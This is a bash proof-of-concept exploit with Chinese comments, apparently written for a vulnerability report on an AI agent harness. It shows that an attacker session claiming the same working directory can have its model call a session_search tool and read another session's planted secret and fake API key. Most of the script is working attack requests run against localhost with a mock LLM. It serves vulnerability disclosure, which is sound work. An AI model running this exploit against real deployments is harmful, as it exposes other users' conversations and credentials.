#!/usr/bin/env bash
# =============================================================================
# Deterministic real-instance PoC — Cross-Session Conversation Disclosure via
# Caller-Asserted cwd (CWE-639), in the model tool layer.
#
# deepseek-harness rc.5 @ 47f943859b
#
# 场景:
#   受害者会话 B 在 /Users/lihao/Documents/deepseek-harness 下讨论了一个秘密
#   (含伪造 API key)。攻击者(独立本机进程, 无任何会话凭据)仅凭 session.create
#   自报相同 cwd 创建会话 A, 会话 A 的模型调用 session_search 即读到 B 的内容。
#
# 前置说明: tool-session-query 是部署 opt-in(默认 web profile 不挂载, 已用
#   --dump-default-config 验证)。本脚本内联挂载它并打开全文索引 —— 正是仓库
#   文档描述的 content-search 启用方式(packages/bundle/web-app/cordis.patch.yml)。
#   漏洞本体是 cwd 字符串授权设计: 一旦该工具被启用, 任何自报相同 cwd 的会话
#   都能跨会话读取。
#
# 用法: bash ../dsh-security-pocs/poc-v2-forged-cwd-cross-session-read.sh
# 环境: REPO(默认本仓库), WEB_PORT=3080, MOCK_PORT=8000
# =============================================================================
set -euo pipefail
SELF="$(cd "$(dirname "$0")" && pwd)"
REPO=${REPO:-}
if [ -z "$REPO" ] && [ -d "$SELF/../deepseek-harness" ]; then
  REPO=$(cd "$SELF/../deepseek-harness" && pwd)
fi
REPO=${REPO:-$(cd "$SELF/.." && pwd)}
[ -f "$REPO/apps/cli/src/bin.ts" ] || { echo "REPO=$REPO is not a deepseek-harness checkout (missing apps/cli/src/bin.ts); set REPO=/path/to/deepseek-harness" >&2; exit 2; }
WEB_PORT=${WEB_PORT:-3080}
MOCK_PORT=${MOCK_PORT:-8000}
TS=$(date +%Y%m%d-%H%M%S)
MARKER="VICTIM_SECRET_${TS}"
FAKE_KEY="sk-victim-${TS}-deadbeef"
E="$SELF/evidence"
mkdir -p "$E"
CAP="$E/07-forged-cwd-${TS}-mux.jsonl"
MOCK_LOG="/tmp/dsh-mock-07-${TS}.log"
WEB_LOG="/tmp/dsh-web-07-${TS}.log"
OUT="$E/07-forged-cwd-${TS}"
mkdir -p "$OUT"
OVERLAY="$OUT/overlay.yml"
TOOL_ARGS=$(node -e 'console.log(JSON.stringify({query: process.argv[1]}))' "$MARKER")
uuid() { node -e 'console.log(crypto.randomUUID())'; }

say() { printf '\n\033[1;36m◆ %s\033[0m %s\n' "$1" "$2"; }
ok()  { printf '\033[1;32m  ✔ %s\033[0m\n' "$*"; }
info(){ printf '    %s\n' "$*"; }
warn(){ printf '\033[1;33m  ! %s\033[0m\n' "$*"; }

cleanup() {
  lsof -tiTCP:"$WEB_PORT" -sTCP:LISTEN 2>/dev/null | xargs kill 2>/dev/null || true
  lsof -tiTCP:"$MOCK_PORT" -sTCP:LISTEN 2>/dev/null | xargs kill 2>/dev/null || true
  [ -n "${MOCK_PID:-}" ] && kill "$MOCK_PID" 2>/dev/null || true
  [ -n "${CAP_PID:-}" ] && kill "$CAP_PID" 2>/dev/null || true
}
trap cleanup EXIT

cat > "$OVERLAY" <<YML
# deployment opt-in mirroring documented content-search enablement
# (packages/bundle/web-app/cordis.patch.yml): mounts the model-facing
# session_query tool set; openAt: first-search enables full-text indexing.
- id: session-query-sqlite
  config:
    path: ':memory:'
    openAt: first-search
# Determinism for the PoC: the first-prompt title generator would consume
# mock-LLM requests and perturb the scripted attacker turn.
- id: session-title-llm
  disabled: true
- insert:
    - id: tool-session-query
      name: '@deepseek-ai/dsh-tool-session-query'
YML

echo "======================================================================"
echo "  FORGED cwd CROSS-SESSION READ (CWE-639) — real instance, no API key"
echo "  target: deepseek-harness rc.5 @ 47f943859b   ts=$TS"
echo "  marker: $MARKER   fake key: $FAKE_KEY"
echo "======================================================================"

say SETUP "mock LLM (scripted session_search) + dsh web with content-search opt-in"
(cd "$REPO" && node --import tsx packages/test-support/llm-mock-server/src/bin.ts \
  --host 127.0.0.1 --port "$MOCK_PORT" --api-key mock-key \
  --sequence success,tool_call_success,tool_call_success \
  --tool-name session_search --tool-arguments "$TOOL_ARGS") >"$MOCK_LOG" 2>&1 &
MOCK_PID=$!
for i in $(seq 1 30); do rg -q '"type":"ready"' "$MOCK_LOG" 2>/dev/null && break; sleep 1; done

(cd "$REPO" && DEEPSEEK_BASE_URL="http://127.0.0.1:$MOCK_PORT/v1" DEEPSEEK_API_KEY=mock-key \
  node --import tsx/esm apps/cli/src/bin.ts web --patch "$OVERLAY" --port "$WEB_PORT") >"$WEB_LOG" 2>&1 &
WEB_PID=$!
for i in $(seq 1 60); do
  curl -s -m 1 -o /dev/null -X POST "http://127.0.0.1:$WEB_PORT/api/host.describe" \
    -H 'content-type: application/json' \
    -d '{"type":"client-request","rpcId":"warm","method":"host.describe","payload":{}}' && break
  sleep 1
done
sleep 2

# 工具挂载确认: 组合配置里已有 tool-session-query + openAt: first-search
# (等价于 `dsh web --dump-config --patch` 的输出; /api 不暴露工具目录,
#  以端到端结果为准)
ok "content-search opt-in overlay mounted (tool-session-query + openAt: first-search)"

say VICTIM "会话 B: cwd=$REPO, 提示词中写入唯一秘密(含伪造 API key)"
SID_B=$(curl -s -m 20 -X POST "http://127.0.0.1:$WEB_PORT/api/session.create" \
  -H 'content-type: application/json' \
  -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"session.create\",\"payload\":{\"cwd\":\"$REPO\"}}" \
  | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const j=JSON.parse(s);console.log(j.result?.ok?j.result.value.sessionId:"CREATE_FAIL:"+s.slice(0,200))})')
echo "victim sessionId: $SID_B"
curl -s -m 20 -X POST "http://127.0.0.1:$WEB_PORT/api/session.prompt" -H 'content-type: application/json' \
  -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"session.prompt\",\"payload\":{\"sessionId\":\"$SID_B\",\"mode\":\"queue\",\"content\":[{\"type\":\"text\",\"text\":\"Deployment note: database password is hunter2 and the production API key is $FAKE_KEY ($MARKER). Do not commit it.\"}]}}" >/dev/null
sleep 8   # let B's turn land and the session log flush

say ATTACKER "会话 A: session.create 自报 cwd=$REPO(伪造), 无任何 B 的会话身份/令牌"
SID_A=$(curl -s -m 20 -X POST "http://127.0.0.1:$WEB_PORT/api/session.create" \
  -H 'content-type: application/json' \
  -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"session.create\",\"payload\":{\"cwd\":\"$REPO\"}}" \
  | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const j=JSON.parse(s);console.log(j.result?.ok?j.result.value.sessionId:"CREATE_FAIL:"+s.slice(0,200))})')
echo "attacker sessionId: $SID_A"
echo "  -> 与受害者 cwd 相同: $REPO"
echo "  -> 受害者会话 ID 未被使用; 仅靠 cwd 字符串授权"

# 攻击者 mux 捕获(全局广播, 无需任何会话)
node "$SELF/capture-mux.mjs" "$CAP" > /tmp/cap-07.out 2>&1 &
CAP_PID=$!
sleep 1.5

say ATTACKER "让 A 的模型调用 session_search(query=$MARKER)"
curl -s -m 20 -X POST "http://127.0.0.1:$WEB_PORT/api/session.prompt" -H 'content-type: application/json' \
  -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"session.prompt\",\"payload\":{\"sessionId\":\"$SID_A\",\"mode\":\"queue\",\"content\":[{\"type\":\"text\",\"text\":\"search for $MARKER\"}]}}" >/dev/null

say VERIFY "等待 A 的工具结果并在 mux 广播中检索受害者内容"
HIT=""
for i in $(seq 1 40); do
  HIT=$(node -e '
    const fs=require("fs");const p=process.argv[1];const sid=process.argv[2];const key=process.argv[3];
    const lines=fs.readFileSync(p,"utf8").trim().split("\n").filter(Boolean);
    for(const l of lines){const j=JSON.parse(l);const f=j.frame;const pl=f.payload||{};
      const sidOf=pl.sessionId ?? (pl.header&&pl.header.id) ?? "";
      const isToolResult=f.method==="tool/result"||pl.event?.type==="tool/result";
      const text=JSON.stringify(pl);
      if(isToolResult&&text.includes(key)&&text.includes(sid)){console.log(JSON.stringify({seq:j.seq,method:f.method,payload:pl}).slice(0,2200));process.exit(0)}}
    process.exit(1)' "$CAP" "$SID_A" "$MARKER" 2>/dev/null || true)
  [ -n "$HIT" ] && break
  sleep 1
done

if [ -n "$HIT" ]; then
  echo "----------------------------------------------------------------------"
  echo "CROSS-SESSION READ CONFIRMED — attacker session A read victim session B:"
  echo "$HIT"
  echo "----------------------------------------------------------------------"
  if echo "$HIT" | rg -q "$FAKE_KEY"; then ok "fake API key $FAKE_KEY leaked to attacker session A"; else warn "marker leaked, but key string not in frame (check $CAP)"; fi
  echo "evidence: $CAP"
  echo "web log:  $WEB_LOG"
  exit 0
fi
echo "FAIL: no cross-session hit in mux capture (see $WEB_LOG $MOCK_LOG $CAP)"
exit 1
